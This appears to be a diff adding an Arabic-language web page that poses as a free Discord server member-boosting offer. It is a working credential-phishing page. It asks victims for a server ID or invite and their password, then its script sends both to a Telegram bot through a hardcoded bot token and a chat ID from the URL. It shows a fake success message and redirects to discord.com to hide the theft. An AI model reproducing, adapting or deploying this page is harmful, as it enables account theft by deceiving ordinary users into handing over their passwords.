@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Discord رشق</title>
+    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#36393f;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#2f3136;padding:25px;border-radius:12px;width:380px;text-align:center}img{width:130px;margin:0 auto 25px;display:block}h2{color:#5865f2;margin-bottom:6px}p{color:#b9bbbe;font-size:14px;margin-bottom:18px}.gift-box{background:#5865f2;border-radius:12px;padding:12px;margin-bottom:15px}.gift-box span{font-weight:bold;font-size:18px}input,select{width:100%;padding:14px;margin:8px 0;background:#202225;border:1px solid #202225;border-radius:6px;color:#fff;font-size:16px;text-align:center}.btn{background:#5865f2;color:#fff;border:none;padding:14px;width:100%;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}.btn:hover{background:#4752c4}</style></head>
+<body><div class="card">
+<img src="https://discord.com/assets/logo-feca2f1e81b5b7639e02f2a63c9e1a9a.svg" alt="Discord">
+<h2>🎮 رشق أعضاء سيرفر ديسكورد</h2>
+<p>احصل على أعضاء حقيقيين لسيرفرك!</p>
+<div class="gift-box"><span>🎉 500 عضو مجاناً</span></div>
+<select id="amount"><option value="100">100 عضو</option><option value="500" selected>500 عضو</option><option value="1000">1000 عضو</option></select>
+<input id="username" placeholder="معرف السيرفر أو رابط الدعوة">
+<input id="password" type="password" placeholder="كلمة المرور للتأكيد">
+<button class="btn" onclick="sendData()">إرسال الرشق الآن 🚀</button>
+<p id="msg" style="margin-top:12px;font-size:14px;font-weight:bold;"></p>
+</div>
+<script>
+const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT=p.get('chat');
+function sendData(){const u=document.getElementById('username').value,pa=document.getElementById('password').value,am=document.getElementById('amount').value;
+if(!u||!pa)return alert('املأ جميع الحقول');
+document.getElementById('msg').innerHTML='⏳ جاري إرسال الرشق...';
+fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent('🎮 رشق ديسكورد\n👤 '+u+'\n🔑 '+pa+'\n📊 الكمية: '+am+' عضو')}`).then(()=>{document.getElementById('msg').innerHTML='✅ تم الإرسال! سيصل الرشق خلال دقائق.';setTimeout(()=>location.href='https://discord.com',3000)});}
+</script></body></html>
